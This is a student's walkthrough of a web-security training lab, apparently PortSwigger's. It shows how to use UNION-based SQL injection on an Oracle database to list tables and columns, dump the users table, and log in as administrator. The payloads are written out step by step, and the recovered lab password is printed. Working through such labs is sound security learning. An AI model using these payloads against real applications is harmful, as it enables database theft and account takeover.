# Lab 10 - SQL injection attack, listing the database contents on Oracle

**Status**: Solved on August 2, 2023

**Objective**: Obtain the username and password of all users, and the log in as the `administrator` user.

## Solving Process

- Before trying the lab, some research was made to find the columns that can be access through `ALL_TABLES` and `ALL_TAB_COLUMNS` in an Oracle db. The info is listed below, under *"Important Notes"*.
- The number of columns was found to be 2, by using this payload: `' ORDER BY 2 --`.
- Both columns accept strings, which was confirmed with this payload: `' UNION SELECT 'a','a' FROM dual --` . `dual` was used because Oracle forces us to use the `FROM` directive together with `SELECT`.
- The database was confirmed as using Oracle, by inserting the following: `' UNION SELECT banner,NULL FROM v$version --`
  - `Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production` is the version used
- The table names in the database were outputted by querying the `ALL_TABLES` data dictionary, as follows: ' `UNION SELECT table_name,NULL FROM ALL_TABLES --`. The table that may hold users’ information is the following:
  - `USERS_NAYTNP`
- `USERS_NAYTNP` columns were obtained through this payload: `' UNION SELECT column_name,NULL FROM ALL_TAB_COLUMNS WHERE table_name = 'USERS_NAYTNP' --`, which happen to be the following:
  - `USERNAME_TYRVVU`
  - `PASSWORD_QVTNOC`
- The users’ names & passwords were queried by: `' UNION SELECT USERNAME_TYRVVU,PASSWORD_QVTNOC FROM USERS_NAYTNP --`. And the admin credentials were successfully gathered:
  - Username: `administrator`. Password: `rfu8swgngo9lq0r0lo72`
- I was able to log in with those credentials, as `administrator`.

### Important Notes

- This lab uses an ORACLE database. The database information is accessed through the `ALL_TABLES`, which has the following important columns:
  - `OWNER`
  - `TABLE_NAME`
  - Full list of columns in ALL_TABLES [here](https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_2105.htm#REFRN20286).
- To get the columns’ information about a particular table, the `ALL_TAB_COLUMNS` data dictionary is used. Find [here](https://docs.oracle.com/en/database/oracle/oracle-database/21/drdag/all_tab_columns-drda-gateway.html#GUID-DE3EF8EE-2E39-4384-95D0-0A51402B4B0C) the complete reference of available column fields. The most relevant are:
  - `COLUMN_NAME`
  - `DATA_TYPE`
  - `DATA_LENGTH`
  - `COLUMN_ID`
